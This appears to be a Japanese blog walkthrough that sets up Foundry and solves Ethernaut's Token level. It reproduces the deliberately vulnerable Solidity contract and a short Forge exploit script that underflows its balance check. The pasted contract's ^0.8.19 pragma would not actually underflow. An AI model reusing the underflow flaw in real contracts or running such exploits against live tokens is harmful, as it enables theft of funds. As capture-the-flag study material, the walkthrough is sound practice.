---
title: 'Foundry+solidity環境でblockchain問を解く'
date: 2023-10-20T21:07:20+09:00
draft: false
categories:
  - 環境構築
  - blockchain
tags:
  - foundry
  - solidity
  - blockchain
---
# Foundryの説明とインストール

FoundryはDapp開発のための高速なフレームワークで、Rust製です。FoundryはSolidityだけでスクリプトとテストケースを書くことができ、特にスピードと効率に優れています。以下はFoundryのインストール方法です。

## インストール方法

以下のコマンドを使用してFoundryをインストールします。

```bash
curl -L https://foundry.paradigm.xyz | bash
source /root/.zshenv
foundryup
```

これにより、スクリプトを実行するための `forge` コマンドが利用可能になります。

# Ethernautの問題を解く

次に、Ethernautの問題を解く手順について説明します。ここではEthernautのLevel 5のToken問題を例に説明します。以下は具体的な手順です。

## インスタンスの生成

1. [Ethernautのウェブサイト](https://ethernaut.openzeppelin.com/)にアクセスします。
2. "Token" 問題を開きます。
3. "インスタンスを生成" ボタンをクリックします。
4. 開発者ツールのコンソールからインスタンスIDを取得します。

## プロジェクトのセットアップ

1. 新しいプロジェクトを生成します。

```bash
forge init token
cd token
```

2. Foundryの標準ライブラリをインストールします。

```bash
forge install foundry-rs/forge-std --no-commit
```

3. 環境変数を設定します。INSTANCEIDは先ほど取得したもの、RPC_URLはInfuraなどから取得、PRIVATE_KEYはMetaMaskから取得します。

```bash
PRIVATE_KEY=0x~~~~~
RPC_URL=https://sepolia.infura.io/v3/~~~~~
FOUNDRY_ETH_RPC_URL=https://sepolia.infura.io/v3/~~~~~
INSTANCEID=~~~~~
```

## コントラクトの作成

1. `src` ディレクトリに `Token.sol` を作成し、問題のコントラクトを貼り付けます。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Token {
  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

## Exploitスクリプトの作成

1. `script` ディレクトリに `TokenExploit.sol` を作成し、解法を記述します。

```solidity
pragma solidity ^0.8.19;

import "lib/forge-std/src/Script.sol";
import "../src/Token.sol";

contract TokenExploitScript is Script {
    function run(address instanceAddress) public {
        vm.startBroadcast();

        address anyAddr = 0x0000000000000000000000000000000000000000;
        Token(payable(instanceAddress)).transfer(anyAddr, 21);
        
        vm.stopBroadcast();
    }
}
```

## 解法の実行

1. 以下のコマンドで解法を実行します。

```bash
forge script TokenExploitScript -vvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --broadcast --sig "run(address)" $INSTANCEID
```

2. ブラウザからインスタンスの提出を行うと、問題が解けているはずです。

